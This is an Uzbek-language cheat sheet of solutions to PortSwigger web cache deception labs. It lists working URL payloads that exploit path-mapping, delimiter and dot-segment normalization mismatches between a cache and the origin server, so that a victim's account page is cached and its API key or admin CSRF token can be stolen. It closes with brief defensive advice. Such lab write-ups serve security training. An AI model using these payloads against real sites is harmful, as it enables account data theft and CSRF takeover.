# Web Cache Deception — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**.
> Fikr: victim'ning shaxsiy sahifasini (`/my-account`, API key) static fayl ko'rinishida cache'ga
> tushirib, keyin o'zing o'sha cache'dan o'qiysan. `X-Cache: miss`→`hit` = cache'landi.
> Delimiter ro'yxati: Burp Intruder (URL-encoding OFF). Victim'ga exploit server'dan link yetkazasan.

### Exploiting path mapping — PRACTITIONER
Origin `/my-account/abc` ni `/my-account` ga map qiladi, cache `.js` ni static deb biladi.
```
/my-account/abc.js        → X-Cache: miss, keyin hit
Exploit: victim'ni /my-account/wcd.js ga yo'naltir → o'zing o'sha URL'ni och → API key
```

### Exploiting path delimiters — PRACTITIONER
Origin `;` ni delimiter deb biladi, cache bilmaydi.
```
/my-account;abc.js        → cache: miss→hit (origin /my-account qaytaradi)
Exploit: /my-account;wcd.js
```

### Exploiting origin server normalization — PRACTITIONER
Origin `?` delimiter + encoded dot-segment resolve qiladi; cache `/resources` prefiksini static biladi.
```
/resources/..%2fmy-account?wcd
```
> Origin `/my-account` ga resolve qiladi, cache `/resources` qoidasi bilan saqlaydi. `?wcd` = cache buster.

### Exploiting cache server normalization — PRACTITIONER
Cache encoded dot-segment resolve qiladi (origin yo'q). `%23` delimiter ishlaydi (`#` browser kesadi).
```
/my-account%23%2f%2e%2e%2fresources/   ← %23 delimiter + %2f..%2f resources'ga qaytish
```

### Exploiting exact-match cache rules — PRACTITIONER
Cache aniq fayl (`/robots.txt`) qoidasi + dot-segment normalize. Admin CSRF token o'g'irlaysan.
```
/my-account;%2f%2e%2e%2frobots.txt
```
> `;` origin uchun delimiter → `/my-account`; cache `/robots.txt` deb saqlaydi. Admin CSRF token olib,
> `POST /my-account/change-email` ga qo'yasan (CSRF PoC exploit serverda).

---

### Eslatma
Nega ishlaydi: cache "static" deb o'ylaydi (kengaytma/prefiks/exact), origin dinamik qaytaradi →
shaxsiy javob cache'ga tushadi. Delimiter/normalization nomuvofiqligi = kalit. Himoya: cache va
origin bir xil URL parse qilsin, `Cache-Control: no-store` shaxsiy sahifalarga. Umumiy: bu papka README.
